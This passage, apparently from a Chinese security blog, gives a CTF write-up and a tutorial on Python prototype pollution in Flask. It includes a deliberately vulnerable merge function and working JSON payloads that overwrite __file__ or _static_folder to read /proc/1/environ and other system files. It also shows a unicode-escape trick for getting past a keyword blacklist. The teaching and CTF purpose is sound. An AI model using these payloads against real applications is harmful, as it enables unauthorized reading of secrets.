i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> <span class="variable language_">self</span>.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br></pre></td></tr></table></figure></li><li><p>原型链污染，in似乎无法递归判断，密码存在内存中，没有admin –&gt; <strong>实际中in是由递归判断的</strong></p></li><li><p>目的和注入点是open那里，难道可以命令执行吗在这里，看不到触发点啊，先从open出发，毕竟明显</p></li><li><p>那么可以覆盖<code>__file__</code>然后读取flag文件？这里<code>__file__</code>可以通过全局变量直接覆写，就是本模块的命名空间中的内容</p></li><li><p>payload</p><ol><li>可以测出来是过滤了<code>__init__</code>，其他都保留了</li><li>没有找到flag文件，读取环境变量</li><li><code>/proc/1/environ</code>和<code>/proc/self/environ</code>中都读，是前一个个</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;__class__&quot;</span>:&#123;<span class="string">&quot;check&quot;</span>:&#123;<span class="string">&quot;__globals__&quot;</span>:&#123;<span class="string">&quot;__file__&quot;</span>:<span class="string">&quot;/proc/1/environ&quot;</span>&#125;&#125;&#125;,<span class="string">&quot;11tadbx0ae9b&quot;</span>:<span class="string">&quot;=&quot;</span>&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><ol><li><p>常见环境变量</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 环境变量是以空字符（\0）分隔的字符串形式存储的，只读的，不能修改</span></span><br><span class="line">/proc/<span class="number">1</span>/environ </span><br><span class="line">    <span class="comment"># init 进程的 PID 为 1，它在系统启动时由内核启动，并且在整个系统运行期间一直存在</span></span><br><span class="line">    <span class="comment"># 包含了 init 进程的环境变量</span></span><br><span class="line">/proc/<span class="variable language_">self</span>/environ  <span class="comment"># 这个文件包含了当前进程（即执行该命令的进程）的环境变量</span></span><br><span class="line"></span><br><span class="line">/etc/profile</span><br><span class="line"></span><br><span class="line">/etc/profile.d/*.sh</span><br><span class="line"></span><br><span class="line">~/.bash_profile</span><br><span class="line"></span><br><span class="line">~/.bashrc</span><br><span class="line"></span><br><span class="line">/etc/bashrc</span><br></pre></td></tr></table></figure></li></ol><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="*编码绕过"></a>*编码绕过</h3><ol><li>虽然这里使用的是通过check函数对象的<code>__globals__</code>属性来获取全局变量，但是也可以通过编码进行绕过，涉及到python中的unicode<ol><li>在 Python 3 中，字符串默认是 Unicode 字符串，使用 str 类型表示。你可以直接在字符串中使用 Unicode 字符</li><li>这里源码中有一个<code>json.loads()</code>是从字符串转换的，刚好可以利用<code>__init__ # \u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F</code></li></ol></li></ol><h3 id="静态目录写入-一个很不错的思路"><a href="#静态目录写入-一个很不错的思路" class="headerlink" title="*静态目录写入 -&gt; 一个很不错的思路"></a>*静态目录写入 -&gt; 一个很不错的思路</h3><ol><li><p>先看一眼payload吧</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;__init\u005f_&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;/&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Flask app 全局变量</p><ol><li>app 是 Flask 应用的实例，是一个 Flask 对象。通过创建 app 对象，我们可以定义路由、处理请求、设置配置等，从而构建一个完整的 Web 应用程序。</li><li>Flask app实例是整个应用的核心，负责处理用户的请求并返回相应的响应。可以通过 app.route 装饰器定义路由，将不同的 URL 请求映射到对应的处理函数上。</li><li>app 对象包含了大量的功能和方法，例如 route、run、add_url_rule 等，这些方法用于处理请求和设置应用的各种配置。</li><li>通过 app.run() 方法，我们可以在指定的主机和端口上启动 Flask 应用，使其监听并处理客户端的请求</li></ol></li><li><p>_static_folder 全局变量</p><ol><li>_static_folder 是 Flask 应用中用于<strong>指定静态文件的文件夹路径</strong>。静态文件通常包括 CSS、JavaScript、图像等，用于展示网页的样式和交互效果。</li><li>静态文件可以包含在 Flask 应用中，例如 CSS 文件用于设置网页样式，JavaScript 文件用于实现网页的交互功能，图像文件用于显示图形内容等。</li><li>在 Flask 中，可以通过 app.static_folder 属性来访问_static_folder，并指定存放静态文件的文件夹路径。默认情况下，静态文件存放在应用程序的根目录下的 static 文件夹中。</li><li>Flask 在处理请求时，会自动寻找静态文件的路径，并将静态文件发送给客户端，使网页能够正确地显示样式和图像</li></ol></li><li><p><em><strong>利用原理</strong></em>: <code>/static/proc/1/environ</code>：由于”_static_folder”:”&#x2F;“把静态目录直接设置为了根目录，所以根目录下<code>/proc/1/environ</code>可以通过访问静态目录<code>/static/proc/1/environ</code>访问</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> Python安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从原型链深入理解flask的ssti</title>
      <link href="/2024/11/12/%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3flask%E7%9A%84ssti/"/>
      <url>/2024/11/12/%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3flask%E7%9A%84ssti/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这一篇的ssti主要建立在原型链污染上，要求对jinja2的一些变量可控才可以，<em><strong>并不是常规的ssti思路</strong></em>，只适用于ssti+pp<br><em><strong>奇技淫巧和思路很妙</strong></em>，打开脑洞了</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Python安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python原型链污染</title>
      <link href="/2024/11/11/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2024/11/11/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<h2 id="纳尼？python还有原型链？"><a href="#纳尼？python还有原型链？" class="headerlink" title="纳尼？python还有原型链？"></a>纳尼？python还有原型链？</h2><blockquote><p>接触python以来一直以为就是类的模型，直到24的强网拟态中的见到后才直到，其实也是热门考点了</p></blockquote><h3 id="Python中的对象模型"><a href="#Python中的对象模型" class="headerlink" title="Python中的对象模型"></a>Python中的对象模型</h3><h4 id="实例对象与类对象"><a href="#实例对象与类对象" class="headerlink" title="实例对象与类对象"></a>实例对象与类对象</h4><ol><li><strong>对象 (Object)</strong><ol><li>一切皆对象。每个对象都有一个类型（或类）、一个值和一个标识。</li><li>对象的标识是对象的唯一标识符，可以通过 id() 函数获取。</li><li>对象的类型是对象所属的类，可以通过 type() 函数获取。</li><li>对象的值是对象的实际数据。</li></ol></li><li><strong>类 (Class)</strong><ol><li>类是对象的蓝图，定义了对象的属性和方法。</li><li>类可以继承其他类，从而获得父类的属性和方法。</li></ol></li><li><strong>实例 (Instance)</strong><ol><li>实例是类的具体对象，通过调用类的构造函数（通常是 <code>__init__</code> 方法）创建</li><li>实例有自己的属性和方法，这些属性和方法可以与类的其他实例不同</li></ol></li><li><em><strong>类对象与实例对象</strong></em><ol><li><strong>类对象</strong>是由 class 关键字定义的，用于创建实例对象。类对象可以包含属性（变量）和方法（函数），这些属性和方法可以被实例对象继承<ol><li>cpp中的静态变量就是python类对象的属性，类变量：属于类对象，所有实例对象共享同一个类变量</li></ol></li><li><strong>实例对象</strong>: 每个实例对象都是类对象的一个具体实例。实例对象在内存中是独立的，但它们共享类对象的属性和方法</li><li>访问权限<ol><li>类变量可以通过类对象和实例对象访问</li><li>实例变量只能通过实例对象访问</li></ol></li></ol></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="comment"># 1. 类属性</span></span><br><span class="line">    class_attribute = <span class="string">&quot;This is a class attribute&quot;</span></span><br><span class="line">    <span class="comment"># 2. 类方法: @classmethod 和 cls</span></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">class_method</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Class method called. Class name: <span class="subst">&#123;cls.__name__&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 实例方法: self</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        <span class="comment"># 4. 实例属性，在__init__或者实例确定后添加</span></span><br><span class="line">        <span class="variable language_">self</span>.value = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">instance_method</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Instance method called. Value: <span class="subst">&#123;self.value&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="getattr-setattr-and-delattr"><a href="#getattr-setattr-and-delattr" class="headerlink" title="getattr, setattr and delattr"></a>getattr, setattr and delattr</h4><blockquote><p>在 Python 中，有一些内置方法可以在对象中处理未找到的属性或方法。这些方法允许你在尝试访问不存在的属性或方法时提供自定义行为<br>python中的getter和setter都是实例方法</p></blockquote><ol><li><p><em><strong>所谓”getter1”: <code>__getattr__(self, name)</code></strong></em></p><ol><li>用途：当访问一个不存在的属性时，Python 会调用 <code>__getattr__</code> 方法</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getattr__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">&#x27;age&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">30</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> AttributeError(<span class="string">f&quot;&#x27;<span class="subst">&#123;self.__class__.__name__&#125;</span>&#x27; object has no attribute &#x27;<span class="subst">&#123;name&#125;</span>&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">obj = MyClass()</span><br><span class="line"><span class="built_in">print</span>(obj.age)  <span class="comment"># 输出: 30</span></span><br><span class="line"><span class="built_in">print</span>(obj.name)  <span class="comment"># 抛出 AttributeError</span></span><br></pre></td></tr></table></figure></li><li><p><em><strong>所谓”getter2”: <code>__getattribute__(self, name)</code></strong></em></p><ol><li>当访问任何属性时，Python 会先调用 <code>__getattribute__</code> 方法。这个方法比 <code>__getattr__</code> 更早被调用</li><li><strong>递归调用</strong>: 在 <code>__getattribute__</code> 中，直接访问属性会导致递归调用(再次调用自己的该函数)，因此通常使用 <code>super().__getattribute__(name)</code> 来避免递归</li></ol></li><li><p><em><strong>所谓”setter1”: <code>__setattr__(self, name, value)</code></strong></em> –&gt; 装饰器？</p><ol><li>当设置一个属性时，Python 会调用 <code>__setattr__</code> 方法</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setattr__</span>(<span class="params">self, name, value</span>):</span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">&#x27;age&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(value, <span class="built_in">int</span>):</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;Age must be an integer&quot;</span>)</span><br><span class="line">            <span class="built_in">super</span>().__setattr__(name, value)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">super</span>().__setattr__(name, value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    obj.age = <span class="string">&#x27;thirty&#x27;</span></span><br><span class="line"><span class="keyword">except</span> ValueError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)  <span class="comment"># 输出: Age must be an integer</span></span><br></pre></td></tr></table></figure></li><li><p><em><strong>所谓delattr: <code>__delattr__(self, name)</code></strong></em></p><ol><li>当使用del删除一个属性时，Python 会调用该方法</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__delattr__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">&#x27;age&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Deleting age attribute&quot;</span>)</span><br><span class="line">            <span class="built_in">super</span>().__delattr__(name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">super</span>().__delattr__(name)</span><br><span class="line"></span><br><span class="line">obj = MyClass()</span><br><span class="line">obj.age = <span class="number">30</span></span><br><span class="line"><span class="keyword">del</span> obj.age  <span class="comment"># 输出: Deleting age attribute</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="python原型链污染的来源"><a href="#python原型链污染的来源" class="headerlink" title="**python原型链污染的来源"></a>**python原型链污染的来源</h3><h4 id="基础特性"><a href="#基础特性" class="headerlink" title="基础特性"></a>基础特性</h4><ol><li><em><strong>唯一性</strong></em>: 类对象的唯一性: 在 Python 中，<strong>类对象是唯一的</strong>。当定义一个类时，Python 解释器会在内存中创建一个唯一的类对象，并将类的名称绑定到这个对象。这个类对象包含了类的所有属性和方法，在整个程序运行期间存在</li><li><em><strong>指向同一个类对象</strong></em>: 无论通过类名还是通过实例对象的 <code>__class__</code> 属性，都可以引用到同一个类对象。Python 使用引用机制来确保类对象的唯一性</li><li><em><strong>属性查找</strong></em><ol><li><strong><code>__dict__</code>属性</strong>: 每个类都有一个 <code>__dict__</code> 属性，它是一个字典，存储了类的属性和方法。每个实例也有一个 <code>__dict__</code> 属性，存储了实例的属性</li><li><strong>顺序</strong>: 实例字典 -&gt; 类字典 -&gt; 基类字典 -&gt; 内置方法<ol><li>对比一下js原型链: 对象通过 <code>__proto__</code> 属性链接到其原型对象。属性查找沿着原型链逐级向上查找，直到找到属性或到达原型链的顶端（null）</li></ol></li></ol></li></ol><h4 id="继承与方法解析顺序"><a href="#继承与方法解析顺序" class="headerlink" title="继承与方法解析顺序"></a>继承与方法解析顺序</h4><blockquote><p>在 Python 中，虽然没有像 JavaScript 那样的显式原型链（prototype chain），但 Python 使用了一种类似的机制，即继承机制和方法解析顺序（MRO, Method Resolution Order）。Python 中的类和对象可以<strong>通过继承关系形成一种链式结构</strong>，类似于 JavaScript 的原型链</p></blockquote><ol><li><p>类与对象：在 Python 中，一切皆对象，包括类本身。类定义创建一个类对象，而类实例化创建一个实例对象。每个类对象和实例对象都可以通过特殊属性 <code>__class__</code> 和 <code>__bases__</code> 访问其继承关系</p></li><li><p><em><strong>MRO</strong></em>: 方法解析顺序（MRO）决定了在多继承环境中搜索方法的顺序。MRO 是基于 C3 线性化算法实现的，确保继承关系和方法解析的唯一性和一致性</p><ol><li><strong>super()函数</strong>: 用于在子类中调用父类的方法，遵循 MRO 顺序</li><li><strong>广度优先</strong>: MRO 遵循“广度优先”策略，即优先从左到右查找同级父类的方法</li><li>详见C3线性化合并算法</li></ol> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接以多继承的情况进行讲解吧</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">method</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;A method&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">method</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;B method&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(<span class="title class_ inherited__">A</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">method</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;C method&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>(B, C):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">d = D()</span><br><span class="line">d.method()  <span class="comment"># 输出: B method</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(D.mro())</span><br><span class="line"><span class="comment"># 根据 D(B, C)，首先检查 B，然后检查 C</span></span><br><span class="line"><span class="comment"># 输出: [&lt;class &#x27;__main__.D&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;__main__.C&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;]</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="拼成big-picture"><a href="#拼成big-picture" class="headerlink" title="拼成big picture"></a>拼成big picture</h4><ol><li>通过类对象的唯一性和唯一指向性，如果在访问唯一类对象时进行merge的会将添加类对象的属性(只能添加，不能覆盖，还是涉及到一个地址指向的问题)，从而添加新的内容</li><li>在python中，原型链污染还有更加容易的利用变体，同时危害也更大</li></ol><h2 id="Python和Js不同之处"><a href="#Python和Js不同之处" class="headerlink" title="Python和Js不同之处"></a>Python和Js不同之处</h2><ol><li><p>Nodejs是对键值对的控制来进行污染，而Python则是对类属性值的污染，且只能对类的属性来进行污染不能够污染类的方法</p></li><li><p>注意在python中的object的属性是不可以被污染的</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">merge(evil_playload,<span class="built_in">object</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">object</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># TypeError: cannot set &#x27;flag&#x27; attribute of immutable type &#x27;object&#x27; 或者 TypeError: can&#x27;t set attributes of built-in/extension type &#x27;object&#x27;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="merge情况"><a href="#merge情况" class="headerlink" title="merge情况"></a>merge情况</h2><blockquote><p>由于Python中的类会继承父类中的属性，而类中声明（并不是实例中声明）的属性是唯一的，所以我们的目标就是这些在多个类、示例中仍然指向唯一的属性，如类中自定义属性及以__开头的内置属性等</p></blockquote><h3 id="情形解析"><a href="#情形解析" class="headerlink" title="情形解析"></a>情形解析</h3><ol><li>merge情况和node的一样，都是通过污染要覆盖或者添加的那个属性来实现</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="comment"># the dict has __getitem__</span></span><br><span class="line">            <span class="comment"># possible for pp</span></span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            <span class="comment"># the case when dst is a obj not a dict and owns the key k and v is a dict</span></span><br><span class="line">            <span class="comment"># not possible for pp</span></span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># the case when dst is an obj and v is not a dict OR dst has no key k</span></span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ctfer</span>:  </span><br><span class="line">    flag = <span class="string">&quot;flag&#123;fake_flag&#125;&quot;</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Delete</span>(<span class="title class_ inherited__">ctfer</span>):  